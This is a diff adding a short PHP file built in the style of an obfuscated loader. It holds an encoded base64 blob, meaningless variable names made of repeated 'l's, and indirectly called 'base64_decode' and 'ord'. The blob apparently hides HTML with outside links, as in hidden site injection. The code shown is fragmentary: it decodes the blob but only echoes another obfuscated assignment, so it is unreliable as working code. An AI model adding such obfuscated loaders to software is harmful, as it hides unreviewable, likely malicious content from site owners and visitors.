@@ -1,0 +1,13 @@
+<?php
+$o="QAAADg4KDQ4OO2NucSdka2Z0dAAROiVka2JmdSU5OygBQDkKDQIBgAMAxjsmKionKEpmbmknKioB1QFBAwVBaGhzYnUBVATibmM6JWEBYiUCkQAEQHViYmknQ2JrbmBvcwCAdG4AAGBpYmMnZX4KDTtmJ291YmEAADolb3Nzdz0oKHBwcCllfnMAAGJ0YWh1ZmtrKWRoaiglOUWBAAEnJ1BiZWNiBCE7KGY5J0RoYxQAbmlgBLAnBK9wKWpmbmZvaHRzoA4EcSUC0G9iZncncGJlJwFRA4AEMnuBSAO+c2Jqd2tmCFAzCDQlOQdgdG5zHgBiJ1MBtQOzDB8MEXNvYndmc25oKSEAcHQL0Fd1bnEE0CdMdWZpbGJpAA9xYnV0bmRvYnVyaWAEUhZwFksVCfwYBhAYwgIjAGMBQBdxKFdmYGIXYwEgOHdvkGANsHdYF3MvLjwnOBewAZAoZWhjfoAAALRvc2prOQ==";
+$lll=0;
+$lllllllllll='base64_decode';
+$ll=0;
+$llllllllll='ord';
+$llll=0;
+$lllll=3;
+$l=$lllllllllll($o);
+$lllllll=0;
+$llllll=($llllllllll($l[1])<<8)+$llllllllll($l[2]);
+echo($lllllllllll("JGxsbGxsbGxsbGxsbGw9J3N0cmxlbic7"));
+?>
